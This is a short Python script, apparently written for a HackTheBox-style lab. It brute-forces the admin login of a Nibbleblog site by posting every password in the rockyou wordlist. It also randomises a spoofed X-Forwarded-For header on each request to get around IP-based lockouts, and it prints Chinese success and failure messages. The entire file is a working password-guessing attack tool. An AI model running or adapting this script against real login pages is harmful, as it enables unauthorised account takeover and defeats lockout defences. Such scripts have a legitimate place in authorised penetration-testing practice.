import requests,random
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

def brute(password):
    cookies = {
        'PHPSESSID': 'om2gjl4fma39409rkr14bs1r62',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://10.129.1.135',
        'Connection': 'keep-alive',
        'Referer': 'http://10.129.1.135/nibbleblog/admin.php?controller=user&action=login',
        'Upgrade-Insecure-Requests': '1',
        'X-Forwarded-For':'{0}.{1}.{2}.{3}'.format(random.randint(1,255),random.randint(1,255),random.randint(1,255),random.randint(1,255)),
    }

    params = (
        ('controller', 'user'),
        ('action', 'login'),
    )

    data = {
      'username': 'admin',
      'password': password.strip()
    }

    response = requests.post('http://10.129.1.135/nibbleblog/admin.php', headers=headers, params=params, cookies=cookies, data=data)
    soup = BeautifulSoup(response.text,'html.parser', from_encoding='utf-8')
    alert = soup.find_all(id="alert")
    string = str(alert[0])
    result = string[16:46]
    if result != "Incorrect username or password":
        print('{0}密碼正確'.format(password))
        exit()
    else:
        print("{0}錯誤".format(password))

file = open('/usr/share/wordlists/rockyou.txt','r')
first_line = file.readline()

while True:
    try:
        password = file.readline()
        password = password.strip()
        brute(password)
    except Exception as e:
        print(password,e)



